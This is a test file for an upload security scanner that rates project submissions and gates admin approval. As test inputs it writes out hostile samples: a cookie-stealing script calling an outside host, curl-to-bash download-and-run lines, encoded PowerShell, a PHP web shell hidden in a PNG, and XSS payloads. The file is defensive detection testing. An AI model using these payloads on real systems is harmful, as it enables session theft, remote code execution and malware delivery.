/**
 * Security audit of uploaded projects: every submission and revision is scanned and marked
 * WELL, SUSPICIOUS or DANGEROUS for the Admin before anything is published.
 */
import { beforeEach, describe, expect, it } from 'vitest';
import { auditContent, scanImage, scanText, scanUrl } from '../src/modules/security/scanner.js';
import { COMPLETE_PROJECT, createUser, PNG_BYTES, prisma, resetDb, signedInAgent } from './helpers.js';

const codes = (findings: Array<{ code: string }>) => findings.map((f) => f.code);

describe('Scanner rules (no database)', () => {
  it('marks an ordinary project as well', () => {
    expect(auditContent({ ...COMPLETE_PROJECT })).toEqual({ verdict: 'WELL', findings: [] });
  });

  it('marks script and HTML payloads as dangerous', () => {
    expect(codes(scanText('overview', 'Nice app <script>fetch("//x.io/"+document.cookie)</script>'))).toContain('SCRIPT_TAG');
    expect(codes(scanText('overview', '<img src=x onerror=alert(1)>'))).toContain('HTML_EVENT_HANDLER');
    expect(codes(scanText('summary', 'click javascript:alert(1)'))).toContain('SCRIPT_URI');
    expect(codes(scanText('overview', '<iframe src="https://evil.example"></iframe>'))).toContain('EMBEDDED_FRAME');
  });

  it('marks download-and-run commands and miners as dangerous', () => {
    expect(codes(scanText('overview', 'Install: curl -fsSL https://get.example.com/i | sudo bash'))).toContain('DOWNLOAD_AND_RUN');
    expect(codes(scanText('overview', 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAA='))).toContain('ENCODED_POWERSHELL');
    expect(codes(scanText('overview', 'Pool: stratum+tcp://pool.example.com:3333'))).toContain('CRYPTO_MINER');
  });

  it('marks obfuscation and hidden characters as suspicious', () => {
    expect(scanText('overview', 'run eval(atob("ZG9jdW1lbnQ="))')[0]).toMatchObject({ code: 'OBFUSCATED_CODE', severity: 'SUSPICIOUS' });
    expect(codes(scanText('title', 'Invoice‮txt.exe'))).toContain('HIDDEN_CHARACTERS');
    expect(codes(scanText('overview', 'A'.repeat(240)))).toContain('LONG_ENCODED_BLOB');
  });

  it('checks links: executables and credentials are dangerous, disguised links suspicious', () => {
    expect(scanUrl('demoUrl', 'https://files.example.com/setup.exe')[0]).toMatchObject({ code: 'EXECUTABLE_DOWNLOAD', severity: 'DANGEROUS' });
    expect(codes(scanUrl('demoUrl', 'https://paypal.com@evil.example/login'))).toContain('LINK_WITH_CREDENTIALS');
    expect(codes(scanUrl('demoUrl', 'https://bit.ly/3abc'))).toEqual(['SHORTENED_LINK']);
    expect(codes(scanUrl('demoUrl', 'https://203.0.113.9:8443/app'))).toEqual(['IP_ADDRESS_LINK', 'UNUSUAL_PORT']);
    expect(codes(scanUrl('demoUrl', 'https://xn--pypal-4ve.com'))).toEqual(['LOOKALIKE_DOMAIN']);
    expect(scanUrl('demoUrl', 'https://my-app.vercel.app/demo')).toEqual([]);
  });

  it('checks links written inside the text too', () => {
    expect(codes(scanText('overview', 'Get the client at https://dl.example.com/client.apk today.'))).toContain('EXECUTABLE_DOWNLOAD');
  });

  it('passes a clean image and catches files hidden inside one', () => {
    expect(scanImage('png', PNG_BYTES)).toEqual([]);
    const polyglot = Buffer.concat([PNG_BYTES, Buffer.from('<?php system($_GET["c"]); ?>')]);
    expect(codes(scanImage('png', polyglot))).toEqual(expect.arrayContaining(['IMAGE_TRAILING_DATA', 'IMAGE_HIDES_SERVER_CODE']));
    expect(codes(scanImage('png', PNG_BYTES.subarray(0, 30)))).toEqual(['IMAGE_MALFORMED']);
  });

  it('finds a Windows program hidden in an image, and stays fast on a crafted 2 MB file', () => {
    const exe = Buffer.alloc(0x100);
    exe.write('MZ', 0, 'latin1');
    exe.writeUInt32LE(0x80, 0x3c);
    exe.write('PE\0\0', 0x80, 'latin1');
    const end = PNG_BYTES.length - 12; // just before the IEND chunk
    const withExe = Buffer.concat([PNG_BYTES.subarray(0, end), exe, PNG_BYTES.subarray(end)]);
    expect(codes(scanImage('png', withExe))).toContain('IMAGE_HIDES_PROGRAM');

    const crafted = Buffer.concat([PNG_BYTES.subarray(0, end), Buffer.from('MZPE\0\0'.repeat(350_000), 'latin1'), PNG_BYTES.subarray(end)]);
    const started = performance.now();
    scanImage('png', crafted);
    expect(performance.now() - started).toBeLessThan(250);
  });

  it('ranks findings with the dangerous ones first and keeps excerpts short', () => {
    const result = auditContent({ ...COMPLETE_PROJECT, overview: `see https://bit.ly/x then <script>${'x'.repeat(300)}</script>` });
    expect(result.verdict).toBe('DANGEROUS');
    expect(result.findings[0].severity).toBe('DANGEROUS');
    expect(result.findings.every((f) => (f.excerpt ?? '').length <= 80)).toBe(true);
  });
});

describe('Audit in the review flow', () => {
  beforeEach(resetDb);

  async function setup(overrides: Record<string, unknown> = {}) {
    const owner = await createUser({ role: 'UPLOADER' });
    const admin = await createUser({ role: 'ADMIN' });
    const ownerAgent = await signedInAgent(owner.email);
    const adminAgent = await signedInAgent(admin.email);
    const { body } = await ownerAgent.post('/api/projects').send({ ...COMPLETE_PROJECT, ...overrides });
    return { owner, admin, ownerAgent, adminAgent, id: body.id as string };
  }

  it('records a WELL audit on submission without alerting anyone', async () => {
    const { ownerAgent, adminAgent, admin, id } = await setup();
    expect((await ownerAgent.post(`/api/projects/${id}/submit`).send({ ownershipDeclared: true })).status).toBe(200);
    expect(await prisma.auditLog.findMany({ where: { action: 'SECURITY_AUDIT', targetId: id } })).toMatchObject([{ newValue: 'WELL', oldValue: null, reason: null }]);
    expect(await prisma.notification.count({ where: { recipientId: admin.id, eventType: 'SECURITY_ALERT' } })).toBe(0);

    const queue = await adminAgent.get('/api/admin/reviews');
    expect(queue.body.submissions[0].security).toEqual({ verdict: 'WELL', findings: [] });
    expect((await adminAgent.post(`/api/admin/reviews/projects/${id}/approve`)).status).toBe(200);
  });

  it('flags a dangerous submission to every Admin, but tells the owner nothing', async () => {
    const { owner, ownerAgent, adminAgent, admin, id } = await setup({ overview: `${COMPLETE_PROJECT.overview} Setup: curl https://x.example/i.sh | bash` });
    expect((await ownerAgent.post(`/api/projects/${id}/submit`).send({ ownershipDeclared: true })).status).toBe(200);

    expect(await prisma.notification.findMany({ where: { recipientId: admin.id, eventType: 'SECURITY_ALERT' } })).toMatchObject([{ targetId: id }]);
    expect(await prisma.notification.count({ where: { recipientId: owner.id, eventType: 'SECURITY_ALERT' } })).toBe(0);
    const ownerView = await ownerAgent.get(`/api/projects/${id}/workspace`);
    expect(JSON.stringify(ownerView.body)).not.toMatch(/DANGEROUS|DOWNLOAD_AND_RUN/);

    const queue = await adminAgent.get('/api/admin/reviews');
    expect(queue.body.submissions[0].security.verdict).toBe('DANGEROUS');
    expect(queue.body.submissions[0].security.findings[0]).toMatchObject({ code: 'DOWNLOAD_AND_RUN', field: 'overview' });
  });

  it('holds back approval of dangerous content until an Admin overrides with a reason', async () => {
    const { ownerAgent, adminAgent, admin, id } = await setup({ demoUrl: 'https://files.example.com/setup.exe' });
    await ownerAgent.post(`/api/projects/${id}/submit`).send({ ownershipDeclared: true });

    const blocked = await adminAgent.post(`/api/admin/reviews/projects/${id}/approve`);
    expect(blocked.status).toBe(409);
    expect(blocked.body.error.code).toBe('SECURITY_REVIEW_REQUIRED');
    expect((await adminAgent.post(`/api/admin/reviews/projects/${id}/approve`).send({ overrideSecurity: true, reason: 'ok' })).status).toBe(409);
    expect((await prisma.project.findUniqueOrThrow({ where: { id } })).status).toBe('SUBMITTED');

    const ok = await adminAgent.post(`/api/admin/reviews/projects/${id}/approve`).send({ overrideSecurity: true, reason: 'Checked by hand: the installer is the team’s signed release.' });
    expect(ok.status).toBe(200);
    expect(await prisma.auditLog.findFirst({ where: { action: 'SECURITY_OVERRIDE', targetId: id } })).toMatchObject({ actorId: admin.id, newValue: 'EXECUTABLE_DOWNLOAD' });
  });

  it('lets an Admin approve suspicious content after looking, with no override needed', async () => {
    const { ownerAgent, adminAgent, id } = await setup({ demoUrl: 'https://bit.ly/solar-demo' });
    await ownerAgent.post(`/api/projects/${id}/submit`).send({ ownershipDeclared: true });
    const queue = await adminAgent.get('/api/admin/reviews');
    expect(queue.body.submissions[0].security.verdict).toBe('SUSPICIOUS');
    expect((await adminAgent.post(`/api/admin/reviews/projects/${id}/approve`)).status).toBe(200);
  });

  it('audits a revision to a live project and gates its approval the same way', async () => {
    const { ownerAgent, adminAgent, id } = await setup();
    await ownerAgent.post(`/api/projects/${id}/submit`).send({ ownershipDeclared: true });
    await adminAgent.post(`/api/admin/reviews/projects/${id}/approve`);

    expect((await ownerAgent.patch(`/api/projects/${id}`).send({ overview: `${COMPLETE_PROJECT.overview} <script>alert(1)</script>` })).status).toBe(200);
    const revision = await prisma.projectRevision.findFirstOrThrow({ where: { projectId: id } });
    expect(await prisma.auditLog.findFirst({ where: { action: 'SECURITY_AUDIT', oldValue: revision.id } })).toMatchObject({ newValue: 'DANGEROUS', reason: 'SCRIPT_TAG' });

    const queue = await adminAgent.get('/api/admin/reviews');
    expect(queue.body.revisions[0].security.verdict).toBe('DANGEROUS');
    expect((await adminAgent.post(`/api/admin/reviews/revisions/${revision.id}/approve`)).status).toBe(409);
    expect((await prisma.project.findUniqueOrThrow({ where: { id } })).overview).toBe(COMPLETE_PROJECT.overview);
  });

  it('refuses an image with a hidden payload, stores nothing, and tells the Admins', async () => {
    const { ownerAgent, admin, id } = await setup();
    const polyglot = Buffer.concat([PNG_BYTES, Buffer.from('<script>alert(1)</script>')]);
    const res = await ownerAgent.post(`/api/projects/${id}/media`).attach('screenshots', polyglot, { filename: 'a.png', contentType: 'image/png' });
    expect(res.status).toBe(400);
    expect(res.body.error.code).toBe('UNSAFE_FILE');
    expect(await prisma.projectMedia.count({ where: { projectId: id } })).toBe(0);
    expect(await prisma.auditLog.count({ where: { action: 'UNSAFE_UPLOAD_BLOCKED', targetId: id } })).toBe(1);
    expect(await prisma.notification.count({ where: { recipientId: admin.id, eventType: 'SECURITY_ALERT' } })).toBe(1);

    const cover = await ownerAgent.post(`/api/projects/${id}/cover`).attach('cover', polyglot, { filename: 'c.png', contentType: 'image/png' });
    expect(cover.status).toBe(400);
  });

  it('rejects unknown fields in the approval body', async () => {
    const { ownerAgent, adminAgent, id } = await setup();
    await ownerAgent.post(`/api/projects/${id}/submit`).send({ ownershipDeclared: true });
    expect((await adminAgent.post(`/api/admin/reviews/projects/${id}/approve`).send({ status: 'PUBLISHED' })).status).toBe(400);
  });
});
